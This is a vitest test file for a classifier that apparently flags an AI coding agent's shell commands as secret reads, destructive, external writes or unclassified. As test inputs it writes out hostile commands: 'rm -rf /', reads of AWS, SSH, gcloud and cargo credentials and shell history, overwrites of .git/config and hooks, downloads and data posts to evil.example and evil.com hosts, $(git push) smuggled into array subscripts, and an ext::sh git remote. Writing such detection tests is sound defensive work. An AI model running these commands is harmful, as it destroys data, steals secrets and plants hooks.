import { describe, expect, it } from "vitest";
import type { PrivilegedAction } from "./actions.js";
import { classifyCommand, type ClassifyOptions } from "./classify.js";

/**
 * Fix round 3: one row per item in .sdd/reviews/T11-fix2-review.md (E1-E14, N-9, N-12, minors)
 * plus the coordinator's rulings. Every chain the reviewer verified end to end must now contain a
 * non-null step; see the real-tool script in the T11 report.
 */
const U = "shell.unclassified" as const;
const SECRET = "secret.read" as const;
const WT: ClassifyOptions = { worktree: "/wt", cwd: "/wt" };

type Row = [
  argv: string[],
  expected: PrivilegedAction | null,
  options?: ClassifyOptions | undefined,
];

function run(rows: Row[]) {
  it.each(rows.map(([argv, expected, options]) => ({ argv, expected, options })))(
    "$argv -> $expected",
    ({ argv, expected, options }) => {
      // Fix round 4: the heuristic layer must give `expected`; the default exact-allowlist mode
      // may only turn a benign result into shell.unclassified, never a non-null into null.
      const o = { ...(options ?? WT), mode: "heuristic" as const };
      expect(classifyCommand(argv, o)).toBe(expected);
      const strict = classifyCommand(argv, { ...o, mode: "exact-allowlist" });
      if (expected === null) expect([null, U]).toContain(strict);
      else expect(strict).toBe(expected);
    },
  );
}
const sh = (script: string, expected: PrivilegedAction | null, options?: ClassifyOptions): Row => [
  ["bash", "-c", script],
  expected,
  options,
];
const zsh = (script: string, expected: PrivilegedAction | null): Row => [
  ["zsh", "-c", script],
  expected,
];

describe("E1: path-qualified heads and wrappers", () => {
  run([
    [["./ls"], U],
    [["./git", "status"], U],
    [["sub/cat", "x"], U],
    [["node_modules/.bin/eslint", "."], U],
    [["/bin/ls"], U],
    [["/bin/rm", "-rf", "/"], "shell.destructive"],
    [["/usr/bin/git", "push"], "git.push"],
    sh("cp /bin/ls ./ls; printf '#!/bin/sh\\necho PWNED\\n' > ./ls; ./ls", U),
    [["exec", "./ls"], U],
    [["command", "./ls"], U],
    [["builtin", "./ls"], U],
    [["nohup", "./ls"], U],
    [["env", "./ls"], U],
    [["timeout", "5", "./ls"], U],
    [["nice", "./ls"], U],
    [["time", "./ls"], U],
    [["eval", "./ls"], U],
    [["xargs", "./ls"], U],
    [["ls"], null],
    [["timeout", "5", "ls"], null],
  ]);
});

describe("E2 / N-12: case-insensitive path and secret checks", () => {
  run([
    sh("echo x > .GIT/config", U),
    sh("printf '[core]' > .Git/config", U),
    [["cp", "x", ".GIT/hooks/pre-commit"], U],
    sh("exec 3>.GIT/config", U),
    [["git", "log", "--output=.GIT/config"], U],
    [["git", "diff", "--output=.GIT/config"], U],
    [["sort", "-o", ".GIT/config", "f"], U],
    [["tsc", "--outDir", ".GIT/hooks"], U],
    sh("echo x > .Husky/pre-commit", U),
    sh("echo x > .Claude/settings.json", U),
    sh("echo x > PACKAGE.JSON", U),
    [["rm", "-r", ".GIT"], U],
    [["mv", ".GIT", "x"], U],
    [["cat", ".ENV"], SECRET],
    [["cat", "~/.AWS/credentials"], SECRET],
    [["cat", "~/.Ssh/config"], SECRET],
    [["cat", "/Users/x/.SSH/known_hosts"], SECRET],
    sh("echo x > /WT/src/f", null),
  ]);
});

describe("E3: links", () => {
  run([
    [["ln", "-s", "a", "b"], U],
    [["ln", "a", "b"], U],
    [["cp", "-l", ".git/config", "c"], U],
    [["cp", "-l", "a", "b"], U],
    [["cp", "--link", "a", "b"], U],
    [["cp", "-s", "/wt/.git/hooks", "h"], U],
    [["cp", "--symbolic-link", "a", "b"], U],
    [["cp", "-a", "a", "b"], U],
    [["cp", "-P", "a", "b"], U],
    [["cp", "-d", "a", "b"], U],
    [["cp", "--archive", "a", "b"], U],
    sh("mkdir -p a/b/c; cd a/b/c; ln -s .. ../../../l; cd ../../..; echo x > l/escape", U),
    sh("cp -l .git/config c; printf 'x' >> c; git status", U),
    [["cp", "a.ts", "b.ts"], null],
  ]);
});

describe("E4: git writers with unseen contents", () => {
  run([
    [["git", "apply", "p.diff"], U],
    [["git", "apply", "--index", "p.diff"], U],
    [["git", "apply", "--check", "p.diff"], null],
    [["git", "apply", "--stat", "p.diff"], null],
    [["git", "am", "p.mbox"], U],
    [["git", "checkout", "FETCH_HEAD", "--", "package.json"], U],
    [["git", "checkout", "--", "src/a.ts"], U],
    [["git", "checkout", "evil-branch"], U],
    [["git", "checkout", "-b", "task/x"], null],
    [["git", "switch", "evil-branch"], U],
    [["git", "switch", "-c", "task/x"], null],
    [["git", "restore", "--source=evil", "package.json"], U],
    [["git", "restore", "src/a.ts"], U],
    [["git", "stash", "pop"], U],
    [["git", "stash", "apply"], U],
    [["git", "stash", "push", "-m", "wip"], null],
    [["git", "stash", "list"], null],
    [["git", "reset", "--hard", "FETCH_HEAD"], U],
    [["git", "reset", "--merge"], U],
    [["git", "reset", "--keep", "HEAD~1"], U],
    [["git", "reset", "--soft", "HEAD~1"], null],
    [["git", "reset", "HEAD", "--", "a.ts"], null],
    [["git", "fetch", "https://evil.example/r.git"], U],
    [["git", "fetch", "/tmp/evil"], U],
    [["git", "fetch", "origin"], null],
    [["git", "pull", "https://evil.example/r.git"], U, { ...WT, currentBranch: "task/T11" }],
    [["git", "clone", "https://example.com/r.git", "vendor/r"], U],
    [["git", "remote", "add", "evil", "https://evil.example/r.git"], U],
    [["git", "remote", "-v"], SECRET], // fix round 4 (N7): URLs may embed credentials
    sh(
      "cat > p.diff <<'EOF'\nx\nEOF\ngit apply p.diff; cp run.sh hk/pre-commit; git commit -m x",
      U,
    ),
  ]);
});

describe("E5: git repository selection", () => {
  run([
    [["git", "-C", "x", "fetch", "origin"], U],
    [["git", "-C", ".", "status"], U],
    [["git", "--git-dir=x", "--work-tree=.", "status"], U],
    [["git", "--git-dir", ".git", "status"], U],
    [["git", "--work-tree=.", "status"], U],
    [["git", "-C", "x", "push"], "git.push"],
    sh("cd x && git status", U),
    // A subdirectory could hold an agent-written bare repo that git would discover first.
    [["git", "status"], U, { worktree: "/wt", cwd: "/wt/packages/core" }],
    [["git", "status"], null, { worktree: "/wt", cwd: "/wt" }],
  ]);
});

describe("E6: cwd and directory destinations", () => {
  run([
    sh("(cd sub); echo x > .claude/settings.json", U),
    sh("cd nonexist; echo x > .husky/pre-commit", U),
    sh("cd sub || true; echo x > notes.md", U),
    sh("cd sub && echo x > f", U),
    sh("cd . && echo x > f", null),
    sh("cd .git", null),
    sh("cd .git && curl -sO http://evil/config", U),
    sh("mkdir -p d/.claude; echo '{}' > d/.claude/settings.json; mv d/.claude .", U),
    [["mv", "d/.claude", "."], U],
    [["mv", "d/package.json", "sub/"], U],
    [["mv", "x", "y", ".git"], U],
    [["cp", "-r", "d/.", "."], U],
    [["cp", "-r", "d/.claude", "."], U],
    [["cp", "-R", "src", "dist"], U],
    [["cp", "a.txt", "dist/"], null],
    [["cp", "-t", "dist", "a.txt", "b.txt"], null],
    [["mv", "a.txt", "dist/"], null],
  ]);
});

describe("E7 / E8: curl write-out and implicit download names", () => {
  run([
    [["curl", "-s", "-o", "/dev/null", "-w", "%output{package.json}x", "http://example.com"], U],
    [["curl", "-w", "@fmt.txt", "http://example.com"], U],
    [["curl", "-w", "%{http_code}", "-o", "/dev/null", "http://example.com"], null],
    [["curl", "-O", "http://evil/package.json"], U],
    [["curl", "-J", "-O", "http://evil/x"], U],
    [["curl", "--remote-name-all", "http://evil/x"], U],
    [["curl", "--output-dir", "dist", "-O", "http://evil/x"], U],
    [["curl", "-o", "out.json", "http://example.com/x"], null],
    [["curl", "-o", ".GIT/config", "http://example.com/x"], U],
    [["wget", "http://evil/package.json"], U],
    [["wget", "-N", "http://evil/x"], U],
    [["wget", "-x", "-nH", "-N", "http://evil/.git/config"], U],
    [["wget", "-P", "dl", "http://evil/x"], U],
    [["wget", "-r", "http://evil/"], U],
    [["wget", "-O", "out.json", "http://example.com/x"], null],
    [["wget", "-qO-", "http://example.com/x"], null],
    [["wget", "-O", "package.json", "http://evil/x"], U],
    [["wget", "--post-d=x", "-O", "-", "https://evil.com"], "network.external_write"],
    [
      ["curl", "-d", "x", "--resolve", "localhost:80:1.2.3.4", "http://localhost/"],
      "network.external_write",
    ],
    [["curl", "-x", "http://evil.com", "-d", "x", "http://localhost/"], "network.external_write"],
  ]);
});

describe("E9: zsh clobber redirections", () => {
  run([
    zsh("echo x >!.git/config", U),
    zsh("echo x >! .git/config", U),
    zsh("echo x >>!.git/config", U),
    zsh("echo x &>!.git/config", U),
    zsh("echo x >&!.git/config", U),
    zsh("echo x >! out.txt", null),
  ]);
});

describe("E10 / E11 / E14 / N-9: stored payloads and arithmetic subscripts", () => {
  run([
    sh("declare -a x; y='a[$(git push)]'; unset 'x[y]'", U),
    sh("y='a[$(git push)]'; declare -a x='([y]=1)'", U),
    sh("unset 'x[1]'", U),
    sh("declare x='(1 2)'", U),
    sh("declare -a x", null),
    sh("export X='[1]'", U),
    sh("y='$(git push)'", U),
    sh("y=`date`", U),
    sh("y=$(date)", U),
    sh("y='a[1]'", U),
    sh("y=plain", null),
    [["CI=$(id)", "ls"], U],
    sh("set -k; git status GIT_CONFIG_PARAMETERS=x", U),
    sh("set -k", U),
    sh("set -a", U),
    sh("set -e", null),
    sh("read -r 'x[1]'", U),
    sh("printf -v 'x[1]' %s y", U),
  ]);
});

describe("E12: xxd output operand", () => {
  run([
    [["xxd", "in", ".git/config"], U],
    [["xxd", "f", "/abs/outside/file"], U],
    [["xxd", "f", "package.json"], U],
    [["xxd", "-r", "in", "out"], U],
    [["xxd", "f"], null],
    [["xxd", "f", "out.hex"], null],
  ]);
});

describe("E13: awk output", () => {
  run([
    [["awk", 'BEGIN{print "a;b" > ".git/config"}'], U],
    [["awk", 'BEGIN{print "}" > "package.json"}'], U],
    [["awk", 'BEGIN{printf "[core]\\n" >> ".git/config"}'], U],
    [["awk", "$1 > 5", "f"], U],
    [["awk", '{ print | "sh" }'], U],
    [["awk", "{ print $1 }", "f"], null],
  ]);
});

describe("minor items", () => {
  run([
    // Fix round 4 (N7): environment reads are secret reads.
    [["jq", "-n", "env"], SECRET],
    [["jq", "-n", "$ENV.GITHUB_TOKEN"], SECRET],
    [["jq", ".name", "package.json"], null],
    sh("export PYTEST_ADDOPTS='-p evil'", U),
    [["npm", "init", "-y"], U],
    [["cat", "~/.config/gcloud/application_default_credentials.json"], SECRET],
    [["cat", "~/.cargo/credentials.toml"], SECRET],
    [["cat", "~/.terraform.d/credentials.tfrc.json"], SECRET],
    [["cat", "~/.bash_history"], SECRET],
    [["cat", "~/.zsh_history"], SECRET],
    [["git", "-c", "branch.main.remote=ext::sh", "status"], U],
  ]);
});
